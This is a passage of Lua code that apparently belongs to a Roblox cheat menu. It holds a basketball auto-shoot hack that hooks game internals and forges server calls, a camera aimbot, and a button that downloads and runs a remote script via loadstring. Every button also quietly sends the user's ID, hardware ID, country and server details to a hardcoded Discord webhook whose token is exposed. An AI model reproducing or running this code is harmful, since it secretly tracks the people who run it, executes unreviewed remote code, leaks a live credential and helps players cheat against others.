        local Playground = (game.PlaceId == 4923146720)
        local IsInFooting = false
        
        local HL = Instance.new("Highlight")
        HL.Enabled = false
        HL.Adornee = Player.Character
        HL.FillColor = Color3.fromRGB(25, 255, 25)
        HL.OutlineColor = Color3.fromRGB(0, 255, 0)
        HL.Parent = game:GetService("CoreGui")
        
        local Goals = {} do
            for _, Obj in next, game:GetDescendants() do
                if Obj.Name == "Goal" and Obj:IsA("BasePart") then
                    table.insert(Goals, Obj)
                elseif Obj.Name == "Part" and Obj:IsA("BasePart") and Obj.Size == Vector3.new(5, 1, 5) then
                    table.insert(Goals, Obj)
                end
            end
        end
        
        local Shuffled, Selected do
            for _, Garbage in next, getgc(true) do
                if type(Garbage) == "function" and getinfo(Garbage)["name"] == "selected1" then
                    Selected = Garbage
                elseif type(Garbage) == "table" and rawget(Garbage, "1") and rawget(Garbage, "1") ~= true then
                    Shuffled = Garbage
                end
            end
        end
        
        local Clicker do
            if Playground == false then
                Clicker = getupvalue(Selected, 3)
            else
                Clicker = getupvalue(Selected, 5)
            end
        end
        
        local GetClock = function()
            local OldClock = getupvalue(Selected, 3)
            local NewClock = OldClock + 1
            
            setupvalue(Selected, 3, NewClock)
            
            return NewClock
        end
        
        local GetKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            
            if Playground == true then
                return "Shotta_"
            elseif type(Keys[1]) == "string" then
                return Keys[1]
            end
            
            return "Shotta"
        end
        
        local RemoveKeyFromKeyTable = function()
            local StartTime = tick()
            
            repeat task.wait() until Player.Character == nil or Player.Character:FindFirstChild("Basketball") == nil or StartTime - tick() > 1.5
            
            if Player.Character == nil or StartTime - tick() > 1.5 then
                return print("Didnt remove key")
            end
            
            local Keys = getupvalue(Selected, 4)
            
            if type(Keys) == "table" then
                print("Removed key")
                table.remove(Keys, 1)
                setupvalue(Selected, 4, Keys)
            end
        end
        
        local GetRandomizedTable = function(TorsoPosition, ShootPosition)
            local UnrandomizedArgs = {
                X1 = TorsoPosition.X,
                Y1 = TorsoPosition.Y,
                Z1 = TorsoPosition.Z,
                X2 = ShootPosition.X,
                Y2 = ShootPosition.Y,
                Z2 = ShootPosition.Z
            }
            
            local RandomizedArgs = {
                UnrandomizedArgs[Shuffled["1"]],
                UnrandomizedArgs[Shuffled["2"]],
                UnrandomizedArgs[Shuffled["3"]],
                UnrandomizedArgs[Shuffled["4"]],
                UnrandomizedArgs[Shuffled["5"]],
                UnrandomizedArgs[Shuffled["6"]],
            }
            
            return RandomizedArgs
        end
        
        local GetGoal = function()
            local Distance, Goal = 9e9
            
            for _, Obj in next, Goals do
                local Magnitude = (Player.Character.Torso.Position - Obj.Position).Magnitude
                
                if Distance > Magnitude then
                    Distance = Magnitude
                    Goal = Obj
                end
            end
            
            return Goal
        end
        
        local GetDistance = function()
            local Goal = GetGoal()
            local TorsoPosition = Player.Character.Torso.Position
            
            return (TorsoPosition - Goal.Position).Magnitude
        end
        
        local GetDirection = function(Position)
            return (Position - Player.Character.Torso.Position).Unit
        end
        
        local GetMoveDirection = function()
            local Direction = Player.Character.Humanoid.MoveDirection * 1.8
            
            if UIS:IsKeyDown(Enum.KeyCode.S) == true and UIS:IsKeyDown(Enum.KeyCode.W) == true then
                Direction = Player.Character.Humanoid.MoveDirection * 0.5
            elseif UIS:IsKeyDown(Enum.KeyCode.S) == true and UIS:IsKeyDown(Enum.KeyCode.W) == false then
                Direction = Player.Character.Humanoid.MoveDirection * 0.8
            elseif UIS:IsKeyDown(Enum.KeyCode.S) == false and UIS:IsKeyDown(Enum.KeyCode.W) == true then
                Direction = Player.Character.Humanoid.MoveDirection * 1.2
            end
                
            return Direction
        end
        
        local GetBasketball = function()
            return Player.Character:FindFirstChildOfClass("Folder")
        end
        
        local InFootingCheck = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Power do 
                if Basketball ~= nil then
                    Power = Basketball.PowerValue.Value
                else
                    IsInFooting = false
                    return
                end
            end
            
            if Player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                if Power == 75 or Power == 100 then
                    Distance = Distance - 1
                else
                    Distance = Distance - 3
                end
            end
            
            if Power == 75 then
                if Distance > 57 and Distance < 61 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 80 then
                if Distance > 57 and Distance < 64 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 85 then
                if Distance > 57 and Distance < 70 then
                    IsInFooting = true
                else
                    IsInFooting = false
                    end
            elseif Power == 90 then
                if Distance > 57 and Distance < 74 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 95 then
                if Distance > 57 and Distance < 82 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 100 then
                if Distance > 57 and Distance < 87 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power < 75 then
                IsInFooting = false
            end
        end
        
        local GetArc = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Arc = nil
            
            local Power do
                if Basketball ~= nil then
                    Power = Basketball.PowerValue.Value
                else
                    return
                end
            end
            
            if Power == 75 then
                if Distance > 57 and Distance < 59 then
                    Arc = 55
                elseif Distance > 59 and Distance < 60 then
                    Arc = 50
                elseif Distance > 60 and Distance < 61 then
                    Arc = 45
                elseif Distance > 61 and Distance < 62 then
                    Arc = 40
                end
            elseif Power == 80 then
                if Distance > 57 and Distance < 59 then
                    Arc = 75
                elseif Distance > 59 and Distance < 63 then
                    Arc = 70
                elseif Distance > 63 and Distance < 65 then
                    Arc = 60
                elseif Distance > 65 and Distance < 69 then
                    Arc = 50
                end
            elseif Power == 85 then
                if Distance > 57 and Distance < 63 then
                    Arc = 85
                elseif Distance > 63 and Distance < 67 then
                    Arc = 80
                elseif Distance > 67 and Distance < 70 then
                    Arc = 75
                elseif Distance > 70 and Distance < 74 then
                    Arc = 60
                end
            elseif Power == 90 then
                if Distance > 57 and Distance < 63 then
                    Arc = 100
                elseif Distance > 63 and Distance < 67 then
                    Arc = 95
                elseif Distance > 67 and Distance < 69 then
                    Arc = 90
                elseif Distance > 69 and Distance < 74 then
                    Arc = 85
                elseif Distance > 74 and Distance < 77 then
                    Arc = 75
                elseif Distance > 77 and Distance < 79 then
                    Arc = 65
                end
            elseif Power == 95 then
                if Distance > 57 and Distance < 58 then
                    Arc = 120
                elseif Distance > 59 and Distance < 63 then
                    Arc = 115
                elseif Distance > 63 and Distance < 68 then
                    Arc = 110
                elseif Distance > 68 and Distance < 71 then
                    Arc = 105
                elseif Distance > 71 and Distance < 74 then
                    Arc = 100
                elseif Distance > 74 and Distance < 79 then
                    Arc = 95
                elseif Distance > 79 and Distance < 81 then
                    Arc = 90
                elseif Distance > 81 and Distance < 82 then
                    Arc = 65
                elseif Distance > 82 and Distance < 86 then
                    Arc = 60
                end
            elseif Power == 100 then
                if Distance > 57 and Distance < 66 then
                    Arc = 130
                elseif Distance > 66 and Distance < 69 then
                    Arc = 125
                elseif Distance > 69 and Distance < 74 then
                    Arc = 120
                elseif Distance > 74 and Distance < 79 then
                    Arc = 115
                elseif Distance > 79 and Distance < 82 then
                    Arc = 110
                elseif Distance > 82 and Distance < 84 then
                    Arc = 105
                elseif Distance > 84 and Distance < 88 then
                    Arc = 100
                elseif Distance > 88 and Distance < 90 then
                    Arc = 85
                elseif Distance > 90 and Distance < 93 then
                    Arc = 65
                end
            end
            
            if Playground == true and Arc ~= nil then
                Arc = Arc - 5
            end
            
            return Arc
        end
        
        getgenv().Shoot = function()
            local Goal = GetGoal()
            local Arc = GetArc()
            local MoveDirection = GetMoveDirection()
            local Hit = (Goal.Position + Vector3.new(0, Arc, 0) + MoveDirection)
            local Direction = GetDirection(Hit)
            local RandomizedArgs = GetRandomizedTable(Player.Character.Torso.Position, Direction)
            local Basketball = GetBasketball()
            local Key = GetKeyFromKeyTable()
            
            if Playground == true then
                local Clock = GetClock()
                
                Key = Key .. Clock
            end
            
            Clicker:FireServer(Basketball, Basketball.PowerValue.Value, RandomizedArgs, Key)
            
            if GetBasketball() ~= nil then
                RemoveKeyFromKeyTable()
            end
        end
        
        _G.InputBegan = UIS.InputBegan:Connect(function(Key, GPE)
            if not GPE and Key.KeyCode == Enum.KeyCode.X and Player.Character and Player.Character:FindFirstChild("Basketball") and IsInFooting then
                if Player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                    Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.wait(0.25)
                end
                
                Shoot()
            end
        end)
        
        _G.Stepped = RS.Stepped:Connect(function()
            InFootingCheck()
            
            if IsInFooting then
                HL.Enabled = true
            else
                HL.Enabled = false
            end
            
            if HL.Adornee.Parent == nil and Player.Character then
                HL.Adornee = Player.Character
            end
        end)
    end,
 })


 local Button = Tab:CreateButton({
    Name = "Tbot",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed phenom.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        local S, E = pcall(function()
            _G.Stepped:Disconnect()
            _G.InputBegan:Disconnect()
        end)
        
        if S then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Silent Aim",
                Text = "Silent Aim was reset, Mode: TBot",
                Duration = 3
            })
        
            _G.Stepped = nil
            _G.InputBegan = nil
        end
        
        if game.PlaceId == 4923146720 then
            return game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "TBot can't be used in Playground",
                Duration = 5,
                Button1 = "Ok"
            })
        end
        
        local Player = game.Players.LocalPlayer
        local UIS = game:GetService("UserInputService")
        local RS = game:GetService("RunService")
        
        local IsInFooting = false
        
        local HL = Instance.new("Highlight")
        HL.Enabled = false
        HL.Adornee = Player.Character
        HL.FillColor = Color3.fromRGB(25, 255, 25)
        HL.OutlineColor = Color3.fromRGB(0, 255, 0)
        HL.Parent = game.CoreGui
        
        local XYZ = {"X1", "Y1", "Z1", "X2", "Y2", "Z2"}
        local Selected; for _, Garbage in next, getgc(true) do
            if type(Garbage) == "function" and getinfo(Garbage)["name"] == "selected1" then
                Selected = Garbage
            end
        end
        local Goals = {}; for _, Obj in next, workspace:GetDescendants() do
            if Obj.Name == "Goal" and Obj:isA("BasePart") then
                table.insert(Goals, Obj)
            end
        end
        local Shuffled = {}; for _, Garbage in next, getgc(true) do
            if type(Garbage) == "table" and rawget(Garbage, "1") and rawget(Garbage, "1") ~= true then
                for z,x in next, Garbage do
                    Shuffled = Garbage
                end
            end
        end
        
        local Clicker = getupvalue(Selected, 3)
        
        local GetKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            return Keys[1]
        end
        
        local RemoveKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            table.remove(Keys, 1)
            setupvalue(Selected, 4, Keys)
        end
        
        local GetRandomizedTable = function(TorsoPosition, ShootPosition)
            local UnrandomizedArgs = {
                X1 = TorsoPosition.X,
                Y1 = TorsoPosition.Y,
                Z1 = TorsoPosition.Z,
                X2 = ShootPosition.X,
                Y2 = ShootPosition.Y,
                Z2 = ShootPosition.Z
            }
            
            local RandomizedArgs = {
                UnrandomizedArgs[Shuffled["1"]],
                UnrandomizedArgs[Shuffled["2"]],
                UnrandomizedArgs[Shuffled["3"]],
                UnrandomizedArgs[Shuffled["4"]],
                UnrandomizedArgs[Shuffled["5"]],
                UnrandomizedArgs[Shuffled["6"]],
            }
            
            return RandomizedArgs
        end
        
        local GetCorrectPosition = function(Position)
            return Position - Player.Character.Torso.Position
        end
        
        local GetUnitPosition = function(Position)
            return Position.Unit
        end
        
        local GetGoal = function()
            local Distance, Goal = 9e9;
            
            for _, Obj in next, Goals do
                local Magnitude = (Player.Character.Torso.Position - Obj.Position).Magnitude
                
                if Distance > Magnitude then
                    Distance = Magnitude
                    Goal = Obj
                end
            end
            
            return Goal
        end
        
        local GetDistance = function()
            local Goal = GetGoal()
            
            return (Player.Character.Torso.Position - Goal.Position).Magnitude
        end
        
        local GetBasketball = function()
             return Player.Character:FindFirstChildOfClass("Folder") 
        end
        
        local IsDunkAnimPlaying = function()
            for _, Anim in next, Player.Character.Humanoid:GetPlayingAnimationTracks() do
                if Anim.Animation.Name == "Dunk1" then
                    return true
                end
            end
            
            return false
        end
        
        local InFootingCheck = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Power; if Basketball ~= nil then
                Power = Basketball.PowerValue.Value
            else
                IsInFooting = false
                return
            end
            
            if Distance > 57 and Distance < 97 then
                IsInFooting = true
            else
                IsInFooting = false
            end
        end
        
        local GetArc = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Arc
            
            if Distance > 57 and Distance < 63 then
                Arc = 140
            elseif Distance > 63 and Distance < 69 then
                Arc = 135
            elseif Distance > 69 and Distance < 74 then
                Arc = 130
            elseif Distance > 74 and Distance < 79 then
                Arc = 125
            elseif Distance > 79 and Distance < 82 then
                Arc = 120
            elseif Distance > 82 and Distance < 84 then
                Arc = 115
            elseif Distance > 84 and Distance < 88 then
                Arc = 110
            elseif Distance > 88 and Distance < 91 then
                Arc = 100
            elseif Distance > 91 and Distance < 92 then
                Arc = 90
            elseif Distance > 92 and Distance < 93 then
                Arc = 85
            elseif Distance > 93 and Distance < 94 then
                Arc = 80
            elseif Distance > 94 and Distance < 95 then
                Arc = 75
            elseif Distance > 95 and Distance < 96 then
                Arc = 70
            elseif Distance > 96 and Distance < 97 then
                Arc = 67
            end
            
            if IsDunkAnimPlaying() == false and Arc ~= nil then
                Arc = Arc - 10
            end
            
            print(Arc, Distance)
            
            return Arc
        end
        
        local Shoot = function()
            local Goal = GetGoal()
            local Arc = GetArc()
            local CorrectPosition = GetCorrectPosition(Goal.Position + Vector3.new(0, Arc, 0) + Player.Character.Humanoid.MoveDirection)
            local Position = GetUnitPosition(CorrectPosition)
            local RandomizedArgs = GetRandomizedTable(Player.Character.Torso.Position, Position)
            local Basketball = GetBasketball()
            
            local Key = GetKeyFromKeyTable()
            
            if type(Key) ~= "string" then
                Key = "Shotta"
            end
            
            Clicker:FireServer(Basketball, 100, RandomizedArgs, Key)
            
        
            if Key ~= "Shotta" then
                RemoveKeyFromKeyTable()
            end
        end
                    
        _G.InputBegan = UIS.InputBegan:Connect(function(Key, GPE)
            if not GPE and Key.KeyCode == Enum.KeyCode.X and Player.Character and Player.Character:FindFirstChild("Basketball") and IsInFooting then
                if Player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                    local Humanoid =  Player.Character.Humanoid
                    Humanoid.JumpPower = 67
                    Humanoid:LoadAnimation(Player.Character.Basketball.Dunk1):Play()
                    Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.wait(0.325)
                end
                
                Shoot()
                Player.Character.Humanoid.JumpPower = 50
            end
        end)
        
        _G.Stepped = RS.Stepped:Connect(function()
            InFootingCheck()
            
            if IsInFooting then
                HL.Enabled = true
            else
                HL.Enabled = false
            end
            
            if HL.Adornee.Parent == nil and Player.Character then
                HL.Adornee = Player.Character
            end
        end)
    end,
 })












 local Tab = Window:CreateTab("Da Hood", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Da Hood everything lmfao",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed da hood.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        loadstring(game:HttpGet('https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript'))()
    end,
 })


 local Tab = Window:CreateTab("Chicblocko", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Aimbot",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed chicblocko.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        -- CODED BY WINDOWSDRIVERKIT
 
getgenv().Aimbot = {
    Status = true,
    Keybind  = 'C',
    Hitpart = 'HumanoidRootPart',
    ['Prediction'] = {
        X = 0.165,
        Y = 0.1,
    },
}
 
if getgenv().AimbotRan then
    return
else
    getgenv().AimbotRan = true
end
-- make it reexecutable to update settings
 
 
local RunService = game:GetService('RunService')
local Workspace = game:GetService('Workspace')
local Players = game:GetService('Players')
 
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()
 
local Player = nil -- Our target player
 
 
local GetClosestPlayer = function() -- // Optimized GetClosestPlayer i believe?
    local ClosestDistance, ClosestPlayer = 100000, nil
    for _, Player : Player in pairs(Players:GetPlayers()) do
        if Player.Name ~= LocalPlayer.Name and Player.Character and Player.Character:FindFirstChild('HumanoidRootPart') then
            local Root, Visible = Camera:WorldToScreenPoint(Player.Character.HumanoidRootPart.Position)
            if not Visible then
                continue
            end
            Root = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Root.X, Root.Y)).Magnitude
            if Root < ClosestDistance then
                ClosestPlayer = Player
                ClosestDistance = Root
            end
        end
    end
    return ClosestPlayer
end
 
Mouse.KeyDown:Connect(function(key) -- Get our closest player (toggle)
    if key == Aimbot.Keybind:lower() then
        Player = not Player and GetClosestPlayer() or nil
    end
end)
 
RunService.RenderStepped:Connect(function()
    if not Player then
        return
    end
    if not Aimbot.Status then
        return
    end
    local Hitpart = Player.Character:FindFirstChild(Aimbot.Hitpart)
    if not Hitpart then
        return
    end
    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Hitpart.Position + Hitpart.Velocity * Vector3.new(Aimbot.Prediction.X, Aimbot.Prediction.Y, Aimbot.Prediction.X))
end)
    end,
 })
